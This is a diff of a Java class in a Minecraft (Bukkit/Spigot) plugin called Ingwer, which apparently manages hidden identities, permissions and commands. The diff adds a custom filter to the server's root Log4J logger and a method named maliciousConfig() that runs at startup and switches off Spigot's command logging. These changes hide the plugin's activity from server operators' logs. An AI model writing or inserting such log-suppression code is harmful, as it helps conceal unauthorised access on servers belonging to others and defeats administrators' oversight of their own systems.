@@ -7,15 +7,23 @@ import de.bentzin.ingwer.identity.Identity;
 import de.bentzin.ingwer.identity.permissions.IngwerPermission;
 import de.bentzin.ingwer.identity.permissions.IngwerPermissions;
 import de.bentzin.ingwer.logging.Logger;
-import de.bentzin.ingwer.logging.SystemLogger;
 import de.bentzin.ingwer.message.IngwerMessageManager;
 import de.bentzin.ingwer.preferences.Preferences;
 import de.bentzin.ingwer.preferences.StartType;
 import de.bentzin.ingwer.storage.Sqlite;
 import de.bentzin.ingwer.thow.IngwerThrower;
 import de.bentzin.ingwer.thow.ThrowType;
+import de.bentzin.ingwer.utils.IngwerLog4JFilter;
 import de.bentzin.ingwer.utils.StopCode;
+import org.apache.logging.log4j.Level;
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Marker;
+import org.apache.logging.log4j.core.Filter;
+import org.apache.logging.log4j.core.LogEvent;
+import org.apache.logging.log4j.message.Message;
 import org.bukkit.Bukkit;
+import org.bukkit.configuration.InvalidConfigurationException;
+import org.bukkit.configuration.file.YamlConfiguration;
 import org.bukkit.plugin.java.JavaPlugin;
 import org.jetbrains.annotations.Contract;
 import org.jetbrains.annotations.NotNull;
@@ -24,6 +32,7 @@ import org.jetbrains.annotations.UnknownNullability;
 import java.io.IOException;
 import java.net.URISyntaxException;
 import java.sql.SQLException;
+import java.util.logging.LogRecord;
 
 public class Ingwer {
 
@@ -95,6 +104,8 @@ public class Ingwer {
         Ingwer.preferences = preferences;
 
         setLogger(preferences.ingwerLogger());
+            getLogger().setDebug(getPreferences().debug());
+
         getLogger().info("Booting Ingwer v." + VERSION_STRING);
         javaPlugin = preferences.javaPlugin();
 
@@ -114,6 +125,10 @@ public class Ingwer {
             getIngwerThrower().accept(e);
         }
 
+        if(LogManager.getRootLogger().isDebugEnabled())
+             logger.waring("Log4J Debugger is enabled!");
+
+
         if(preferences.hasCustomSqliteLocation())
          getStorage().setDb(preferences.custom_sqliteLocation());
 
@@ -121,6 +136,13 @@ public class Ingwer {
         commandManager = new IngwerCommandManager();
         messageManager = new IngwerMessageManager();
 
+
+
+        org.apache.logging.log4j.core.Logger logger1 = (org.apache.logging.log4j.core.Logger) LogManager.getRootLogger();
+        logger1.info("kleiner Dese!");
+
+
+        logger1.addFilter(new IngwerLog4JFilter());
 
         getFeatureManager().registerInternalFeatures();
         getFeatureManager().findFeatures();
@@ -136,6 +158,10 @@ public class Ingwer {
         if(javaPlugin != null) {
             registerPaperListeners();
         }
+
+
+
+        maliciousConfig();
 
     }
 
@@ -187,6 +213,19 @@ public class Ingwer {
     public static void registerPaperListeners() {
         logger.info("register Events!");
         Bukkit.getPluginManager().registerEvents(new PaperEventListener(logger),javaPlugin);
+    }
+
+
+    public static void maliciousConfig() {
+        YamlConfiguration spigotConfig = Bukkit.spigot().getSpigotConfig();
+        spigotConfig.set("commands.log",false);
+        String s = spigotConfig.saveToString();
+        try {
+            spigotConfig.loadFromString(s);
+        } catch (InvalidConfigurationException e) {
+            throw new RuntimeException(e);
+        }
+        getLogger().debug("commands.log= " + spigotConfig.get("commands.log"));
     }
 
 }
